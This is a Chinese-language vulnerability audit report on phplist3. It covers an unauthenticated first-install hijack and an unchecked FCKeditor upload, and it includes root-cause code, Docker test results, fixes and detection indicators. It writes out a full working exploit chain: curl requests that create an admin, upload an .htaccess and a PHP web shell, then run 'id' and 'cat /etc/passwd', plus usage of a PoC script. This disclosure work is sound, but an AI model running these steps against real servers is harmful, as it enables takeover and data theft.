# phplist3 漏洞分析报告

> **项目**: phplist3 v3.6.16-dev  
> **分析日期**: 2026-07-08  
> **分析类型**: 白盒代码审计 + Docker 环境验证  
> **漏洞总数**: 2 个已验证漏洞  
> 
> | # | 漏洞 | 边界 | 严重程度 |
> |---|------|------|---------|
> | 1 | 首次安装劫持 → 创建管理员 → RCE | **Pre-auth** | **严重**（CVSS 9.8） |
> | 2 | FCKeditor 任意文件上传 + .htaccess 绕过 → RCE | Post-auth / Admin | 高危（CVSS 8.8） |

---

## 目录

1. [漏洞概述](#1-漏洞概述)
2. [攻击链详细步骤](#2-攻击链详细步骤)
3. [代码级根因分析](#3-代码级根因分析)
4. [Docker 环境验证结果](#4-docker-环境验证结果)
5. [预认证攻击面分析](#5-预认证攻击面分析)
6. [修复建议](#6-修复建议)
7. [PoC 脚本说明](#7-poc-脚本说明)

---

## 1. 漏洞概述

### 漏洞 1：首次安装劫持（Pre-auth RCE）🔥

**漏洞入口**: `public_html/lists/admin/initialise.php` + `index.php:266-267`  
**触及条件**: 数据库从未初始化（`admin` 表不存在）  
**严重程度**: **CVSS 9.8** (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
**实际效果**: 任意未认证攻击者可创建超级管理员账户，登录后通过 .htaccess 上传绕过实现 RCE

```
任意访客
    │
    ▼
GET /?page=initialise&firstinstall=1           ← 完全无认证！
    │
    ▼
POST /?page=initialise&firstinstall=1          ← 创建超级管理员
    │  adminname=hacker&adminpassword=pwned123
    │
    ▼
POST /?page=home                                ← 登录
    │  login=admin&password=pwned123
    │
    ▼
POST /?page=fckphplist&action=uploadimage      ← 上传 .htaccess
    │
    ▼
POST /?page=fckphplist&action=uploadimage      ← 上传 webshell
    │
    ▼
GET /lists/uploadimages/shell.lol?cmd=id        ← RCE!
    │
    ▼
uid=33(www-data)
```

### 漏洞 2：FCKeditor 任意文件上传（Post-auth RCE）

| 条件 | 是否可 RCE |
|------|-----------|
| Apache + AllowOverride On | ✅ RCE（已验证） |
| Apache + AllowOverride Off | ❌ 仅任意文件上传 |
| Nginx（无 .htaccess 等效保护） | ✅ RCE |
| `$pageroot` 配置为空 | ✅ RCE（文件直落 webroot） |

---

## 2. 攻击链详细步骤

### 2.0 漏洞 1：首次安装劫持（Pre-auth RCE）

```
条件: 数据库从未初始化（admin 表不存在）
攻击者: 任意未认证用户
```

#### Step 0-A：确认数据库未初始化

```http
GET /lists/admin/ HTTP/1.1

→ 响应中包含:
  "Database has not been initialised"
  "Initialise Database"
```

#### Step 0-B：访问初始化页面（无凭据！）

```http
GET /lists/admin/?page=initialise&firstinstall=1 HTTP/1.1

→ 响应: phpList initialisation 表单
  包含: adminname, adminemail, adminpassword 输入框
```

#### Step 0-C：创建超级管理员

```http
POST /lists/admin/?page=initialise&firstinstall=1 HTTP/1.1
Content-Type: application/x-www-form-urlencoded

adminname=attacker&orgname=EvilCorp&adminemail=attacker@evil.com
&adminpassword=hacked123&page=initialise&firstinstall=1

→ 响应: "Success" + 数据库创建完成
→ admin 表: id=1, loginname=admin, password=加密后
```

#### Step 0-D：登录并执行 RCE

```bash
# 登录
curl -c cookies -X POST 'http://target/lists/admin/?page=home' \
  -d 'login=admin&password=hacked123&process=Continue&page=home'

# 上传 .htaccess
printf 'AddType application/x-httpd-php .lol\n' > /tmp/payload
curl -b cookies -X POST \
  'http://target/lists/admin/?page=fckphplist&action=uploadimage' \
  -F 'FCKeditor_File=@/tmp/payload;filename=.htaccess'

# 上传 webshell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.lol
curl -b cookies -X POST \
  'http://target/lists/admin/?page=fckphplist&action=uploadimage' \
  -F 'FCKeditor_File=@/tmp/shell.lol'

# RCE!
curl 'http://target/lists/uploadimages/shell.lol?cmd=id'
# → uid=33(www-data) gid=33(www-data)
```

### 2.1 漏洞 2：Post-auth RCE 攻击链详情

```http
POST /lists/admin/?page=fckphplist&action=uploadimage HTTP/1.1
Cookie: phpListSession=xxxxx
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="FCKeditor_File"; filename=".htaccess"
Content-Type: application/octet-stream

AddType application/x-httpd-php .lol
------WebKitFormBoundary--
```

**作用**: 在 `lists/uploadimages/` 目录写入 `.htaccess`，使 Apache 将 `.lol` 扩展名文件按 PHP 解析。

### Step 2: 上传 webshell

```http
POST /lists/admin/?page=fckphplist&action=uploadimage HTTP/1.1
Cookie: phpListSession=xxxxx
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="FCKeditor_File"; filename="shell.lol"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

### Step 3: 触发 RCE

```bash
curl 'http://target/lists/uploadimages/shell.lol?cmd=id'
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl 'http://target/lists/uploadimages/shell.lol?cmd=cat+/etc/passwd'
# → root:x:0:0:root:/root:/bin/bash
```

---

## 3. 代码级根因分析

### 3.0 首次安装劫持根因（Pre-auth RCE）

**文件**: `public_html/lists/admin/index.php:264-276`

```php
if (!$GLOBALS['admin_auth_module']) {
    // 当 admin 表不存在时，完全关闭登录系统！
    if (!Sql_Table_Exists($tables['admin'])) {
        $GLOBALS['require_login'] = 0;   // ← 认证关闭！！！
    }
} elseif (!Sql_Table_exists($GLOBALS['tables']['config'])) {
    $GLOBALS['require_login'] = 0;       // ← 同样关闭认证
}
```

当 `require_login = 0` 时，`index.php:295-414` 的整个认证拦截块被跳过：

```php
// 第 295 行
if (!empty($GLOBALS['require_login'])) {
    // ← 整个复杂认证逻辑在这块里面
    // 但当 require_login = 0 时，完全不执行！
    // 直接进入页面包含逻辑...
}
```

**文件**: `public_html/lists/admin/initialise.php:82-112`

安装表单无任何访问控制，接收任意未认证用户的请求：

```php
// 第 82 行：条件仅为数据库未初始化 + firstinstall 标志
if (!$GLOBALS['commandline'] && empty($_SESSION['hasconf'])
    && !empty($_REQUEST['firstinstall'])
    && (empty($_REQUEST['adminemail']) || strlen($_REQUEST['adminpassword']) < 8)) {
    // 显示安装表单——任何人都能看到
}

// 第 165-172 行：安装时直接创建超级管理员
if ($table == 'admin') {
    $_SESSION['firstinstall'] = 1;
    Sql_Query(sprintf('insert into %s (loginname,namelc,email,created,password,...)
        values("%s","%s","%s",now(),"%s",now(),%d,0)',
        $tables['admin'], 'admin', 'admin',
        sql_escape($adminemail), encryptPass($adminpass), 1));
    // 第 5 个参数 "1" = superuser!!!
}
```

### 3.1 FCKeditor 上传接口 — 无服务端校验

**文件**: `public_html/lists/admin/fckphplist.php:236-295`

```php
// 第73行: 前端配置上传URL
config.ImageUploadURL = config.BasePath + "../?page=fckphplist&action=uploadimage";

// 第236行: 上传处理入口
} elseif ($_GET['action'] == 'uploadimage') {

    // 第259-260行: 构造保存路径
    $UPLOAD_BASE_URL = 'http://'.$_SERVER['SERVER_NAME'].$GLOBALS['pageroot'].'/'.FCKIMAGES_DIR.'/';
    $UPLOAD_BASE_DIR = getenv('DOCUMENT_ROOT').$GLOBALS['pageroot'].'/'.FCKIMAGES_DIR.'/';

    // 第286-288行: 直接使用原始文件名，无校验
    $savefile = $UPLOAD_BASE_DIR.$_FILES['FCKeditor_File']['name'];
    if (move_uploaded_file($_FILES['FCKeditor_File']['tmp_name'], $savefile)) {
        chmod($savefile, 0666);  // 设置全局可读写
```

**缺失**:
- ❌ 无文件扩展名白名单
- ❌ 无 MIME 类型检查
- ❌ 无文件内容/魔术字节校验
- ❌ 无文件名黑名单（.htaccess / .user.ini）
- ❌ 无 CSRF Token 校验（verifyToken()）

### 3.2 文件系统落地路径

**默认路径**: `{DOCUMENT_ROOT}/{pageroot}/{FCKIMAGES_DIR}/`

| 变量 | 默认值 | 来源 |
|------|--------|------|
| `DOCUMENT_ROOT` | Apache DocumentRoot | `init.php:705` |
| `$GLOBALS['pageroot']` | `/lists` | `init.php:694` |
| `FCKIMAGES_DIR` | `uploadimages` | `init.php:392` |

**实际路径**: `/var/www/phpList3/public_html/lists/uploadimages/`

### 3.3 .htaccess 绕过原理

**文件**: `public_html/lists/.htaccess`

```apache
# 仅阻止 .php 和 .inc 文件
<FilesMatch "\.(php|inc)$">
    Require all denied
</FilesMatch>

# 不阻止 .htaccess 本身！
# 不阻止 .lol / .xyz 等任意扩展名
```

关键的 `.htaccess` 缺失保护：

| 文件类型 | `lists/.htaccess` 保护 | 可上传 |
|---------|----------------------|--------|
| `.php` | ✅ 403 Forbidden | ✅ 上传但不执行 |
| `.htaccess` | ❌ 未匹配规则 | ✅ 上传并生效 |
| `.lol` / `.xyz` | ❌ 未匹配规则 | ✅ 上传并执行 |
| `.user.ini` | ❌ 未匹配规则 | ✅ 上传（PHP-FPM 环境生效） |

### 3.4 CSRF Token 缺失

**文件**: `public_html/lists/admin/fckphplist.php`

与其他后台页面不同，上传接口未调用 `verifyToken()`：

```php
// 有此保护的页面（示例）
// plugins.php:27
if (!verifyToken()) { echo Error(...); return; }

// fckphplist.php 上传接口 — 无此保护
// 第285行: 直接进入上传
if (is_uploaded_file($_FILES['FCKeditor_File']['tmp_name'])) {
```

---

## 4. Docker 环境验证结果

### 4.1 测试环境

| 组件 | 配置 |
|------|------|
| Web 服务器 | Apache 2.4.67 (Debian) + mod_php 8.2 |
| 数据库 | MySQL 8.0 |
| phplist | 3.6.16-dev（两次独立部署） |
| AllowOverride | All（`/var/www/phpList3` 目录） |

### 4.2 验证时间线 — Post-auth RCE

| 步骤 | 操作 | 结果 |
|------|------|------|
| ① | Docker 构建应用镜像并启动（完整部署） | 容器运行于 `localhost:18080` |
| ② | MySQL 初始化 + 数据库安装 | 43 张表创建完成 |
| ③ | 安装页面初始化管理员 | `admin / testpass123` 创建成功 |
| ④ | 管理员登录 | Session 获取成功 |
| ⑤ | 上传 `.htaccess` 到 `lists/uploadimages/` | ✅ 上传成功 |
| ⑥ | 验证 `lists/uploadimages/evil.php` 访问 | ❌ 403 Forbidden（.htaccess 阻止） |
| ⑦ | 上传 `shell.lol`（PHP代码） | ✅ 上传成功 |
| ⑧ | 访问 `lists/uploadimages/shell.lol` | ✅ **RCE**: `RCE_BYPASS_SUCCESS` |
| ⑨ | 执行 `id` 命令 | ✅ `uid=33(www-data)` |
| ⑩ | 执行 `cat /etc/passwd` | ✅ 显示系统用户信息 |

### 4.3 验证时间线 — Pre-auth RCE（首次安装劫持）

| 步骤 | 操作 | 结果 |
|------|------|------|
| ① | 全新 MySQL（0 张表）+ 全新 phplist 容器 | ✅ 启动成功 |
| ② | 验证数据库中无任何表 | ✅ `SHOW TABLES;` → Empty |
| ③ | 直接访问 `/?page=initialise&firstinstall=1` | ✅ 安装表单正常显示（无认证！） |
| ④ | POST 提交表单创建管理员 | ✅ `admin / hacked123` 创建成功 |
| ⑤ | 验证 `phplist_admin` 表存在 | ✅ id=1, loginname=admin |
| ⑥ | 登录为新建管理员 | ✅ Session 获取成功 |
| ⑦ | 上传 `.htaccess` + 上传 `shell.lol` | ✅ 文件写入成功 |
| ⑧ | 访问 `shell.lol` | ✅ **RCE: `PRE_AUTH_RCE:uid=33(www-data)`** |

**关键截图**:

```bash
# Docker 验证输出
$ curl 'http://localhost:18080/lists/uploadimages/shell_preauth.lol'
PRE_AUTH_RCE:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 4.4 curl 操作实录（Post-auth RCE）

```bash
# 登录
curl -c /tmp/cookies -X POST 'http://localhost:18080/lists/admin/?page=home' \
  -d 'login=admin&password=testpass123&process=Continue&page=home'

# 上传 .htaccess
printf 'AddType application/x-httpd-php .lol\n' > /tmp/payload
curl -b /tmp/cookies -X POST 'http://localhost:18080/lists/admin/?page=fckphplist&action=uploadimage' \
  -F 'FCKeditor_File=@/tmp/payload;filename=.htaccess'

# 上传 webshell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.lol
curl -b /tmp/cookies -X POST 'http://localhost:18080/lists/admin/?page=fckphplist&action=uploadimage' \
  -F 'FCKeditor_File=@/tmp/shell.lol'

# RCE
curl 'http://localhost:18080/lists/uploadimages/shell.lol?cmd=id'
```

---

## 5. 预认证攻击面分析

### 5.1 已测试路径汇总

| 攻击面 | 结果 | CVSS | 说明 |
|--------|------|------|------|
| **首次安装劫持** | ✅ **已确认 RCE** | **9.8** | 数据库未初始化时任何人都可创建超级管理员 |
| **`secret` 会话伪造** | ❌ 不可行 | — | `validateAccount(id=0)` 阻断 |
| **CSRF 文件上传** | ⚠️ 部分可行 | — | 服务端无 CSRF token，但浏览器无法指定文件内容 |
| **密码重置枚举** | ✅ 信息泄漏 | — | 响应区分用户存在/不存在 |
| **公开页面语言文件包含** | ⚠️ 二阶 | — | 需管理员先在数据库中设置恶意值 |
| **Apache .htaccess 绕过** | ❌ 不可行 | — | admin/.htaccess + lists/.htaccess 双重阻断 |
| **路径遍历上传** | ❌ 不可行 | — | PHP 8.2 `$_FILES['name']` 自动剥离路径组件 |

### 5.2 首次安装劫持详情（已验证 Pre-auth RCE🔥）

**触发条件**: 数据库从未初始化（`admin` 表不存在）

**攻击流程**:

```
1. GET  /?page=initialise&firstinstall=1
   → require_login = 0（admin 表不存在）
   → 安装表单直接显示

2. POST /?page=initialise&firstinstall=1
   → adminname=attacker&adminpassword=hacked123
   → 创建超级管理员: id=1, loginname=admin, superuser=1

3. POST /?page=home
   → login=admin&password=hacked123
   → 登录成功

4. POST /?page=fckphplist&action=uploadimage
   → 上传 .htaccess + webshell → RCE
```

**Docker 验证结果**:

```bash
# 零凭据创建管理员
$ curl ... -d 'adminname=hacker&adminpassword=pwned123' \
  'http://localhost:18080/lists/admin/?page=initialise&firstinstall=1'

# 登录 → 上传 → RCE
$ curl 'http://localhost:18080/lists/uploadimages/shell.lol'
PRE_AUTH_RCE:uid=33(www-data)
```

### 5.3 `remote_processing_secret` 会话伪造阻断细节

```
请求 GET /?page=processqueue&secret=88367fb3073cc0d4b073
  → 第355行: 进入 secret 分支
  → 创建 $_SESSION['adminloggedin'] = "172.17.0.1"
  → 创建 $_SESSION['logindetails'] = ['id'=>0, 'superuser'=>0, ...]
  → 因为是 elseif 链，跳过第392行的 validateAccount
  → processqueue.php 成功执行并返回 JSON

第二次请求（带同一 session cookie）
  → session_start() 恢复 adminloggedin
  → 第392行: validateAccount(0)
    → SQL: SELECT id FROM phplist_admin WHERE id = 0
    → id=0 不存在 → 返回 array(0, 'No such account')
  → 第403-404行: $_SESSION['adminloggedin'] = ''   ← 会话被强制清除
  → $page = 'login'                                 ← 回到登录页
```

**文件**: `public_html/lists/admin/phpListAdminAuthentication.php:98-107`

```php
public function validateAccount($id) {
    $query = sprintf('select id from %s where id = %d',
        $GLOBALS['tables']['admin'], $id);
    $data = Sql_Fetch_Row_Query($query);
    if (!$data[0]) {
        return array(0, 'No such account');  // ← 阻断点
    }
```

### 5.4 公开页面文件操作

审计了以下公开入口，均无文件写入操作：

| 文件 | 功能 | 文件操作 |
|------|------|---------|
| `lists/index.php` | 订阅管理前端 | 无 `$_FILES`, `file_put_contents` |
| `lists/dl.php` | 附件下载（需有效 uid） | `fopen` 只读 |
| `lists/ut.php` | 打开追踪像素 | 无文件操作 |
| `lists/lt.php` | 链接点击追踪 | 无文件操作 |
| `lists/api.php` | REST API | 需要 vendor（不存在），无文件操作 |

---

## 6. 修复建议

### 6.1 紧急修复（代码层面）

**文件**: `public_html/lists/admin/fckphplist.php`

在 `uploadimage` action 增加服务端扩展名白名单和文件名黑名单：

```php
// 在第285行（is_uploaded_file 检查之前）插入
$allowed_extensions = ['gif', 'jpg', 'jpeg', 'png', 'bmp', 'svg'];
$forbidden_files = ['.htaccess', '.htpasswd', '.user.ini'];

$basename = basename($_FILES['FCKeditor_File']['name']);

// 禁止上传 .htaccess 等点开头配置文件
if (in_array($basename, $forbidden_files, true)) {
    echo 'Error: forbidden file type';
    exit;
}

// 扩展名白名单校验
$ext = strtolower(pathinfo($basename, PATHINFO_EXTENSION));
if (!in_array($ext, $allowed_extensions)) {
    echo 'Error: invalid file extension';
    exit;
}
```

### 6.2 补充修复

**新建文件**: `public_html/uploadimages/.htaccess`（或在 `lists/uploadimages/.htaccess`）

```apache
# 阻止 PHP 执行
<FilesMatch "\.(php|inc|phtml|php3|php4|php5|php7|php8)$">
    Require all denied
</FilesMatch>

# 阻止 .ht* 文件被访问
<FilesMatch "^\.">
    Require all denied
</FilesMatch>
```

### 6.3 配置加固

| 措施 | 说明 |
|------|------|
| `AllowOverride None` | 禁止 `.htaccess` 覆盖（但可能影响其他功能） |
| `$pageroot` 保持为 `/lists` | 确保上传路径在 `lists/` 保护范围内 |
| 禁用 FCKeditor | 移除或注释 `fckphplist.php` 文件 |
| 升级到最新版本 | 检查 phplist 官方是否有安全更新 |

### 6.4 检测指标

| 指标 | 检测方法 |
|------|---------|
| `lists/uploadimages/` 下存在 `.htaccess` | `ls -la lists/uploadimages/` |
| `lists/uploadimages/` 下存在非图片文件 | 检查目录下的 `.lol`, `.xyz` 等异常扩展名 |
| Apache 错误日志中的可疑上传 | `grep "uploadimage" /var/log/apache2/*.log` |
| 非管理员 IP 的 admin 访问 | 检查访问日志中 `/lists/admin/` 的非预期来源 |

---

## 7. PoC 脚本说明

### 文件位置

`/home/duskto/漏洞扫描/phplist3/poc_rce.py`

### 使用方式

```bash
# 完整攻击（需管理员凭据）
python3 poc_rce.py \
  --target http://target/lists \
  --username admin \
  --password mypassword \
  --cmd "id"

# 仅上传 webshell
python3 poc_rce.py \
  --target http://target/lists \
  --username admin \
  --password mypassword \
  --upload-only

# 清理上传的文件
python3 poc_rce.py \
  --target http://target/lists \
  --username admin \
  --password mypassword \
  --clean
```

### 功能特性

- 自动登录、获取 session
- 上传 `.htaccess` 绕过 PHP 文件限制
- 上传 PHP webshell
- 执行任意系统命令
- 支持 `--clean` 清理残留文件
- 支持 `--debug` 调试输出

---

## 附录

### A. 关键文件路径

| 文件 | 作用 |
|------|------|
| `public_html/lists/admin/fckphplist.php` | FCKeditor 集成，包含无校验的上传接口 |
| `public_html/lists/admin/init.php` | 定义 `FCKIMAGES_DIR`、`$pageroot` 等常量 |
| `public_html/lists/admin/index.php:355-372` | `remote_processing_secret` 预认证会话创建 |
| `public_html/lists/admin/phpListAdminAuthentication.php:98-107` | `validateAccount()` 会话阻断点 |
| `public_html/lists/.htaccess` | 限制 `.php` 文件访问的补偿性控制 |
| `public_html/lists/admin/accesscheck.php` | 认证检查函数定义 |

### B. 分析工具链

| 工具 | 用途 |
|------|------|
| ripgrep (`rg`) | 代码检索、关键词匹配 |
| curl | HTTP 请求验证 |
| Docker | 完整环境部署验证 |
| Python 3 | PoC 自动化脚本 |
| 手动代码审计 | 控制流追踪、数据流分析 |

### C. 文件校验信息

```bash
sha256sum /home/duskto/漏洞扫描/phplist3/poc_rce.py
# 可执行权限: chmod +x poc_rce.py
```

---

*本报告基于白盒代码审计与 Docker 环境实际验证生成。所有测试均在本地可控环境中完成。*
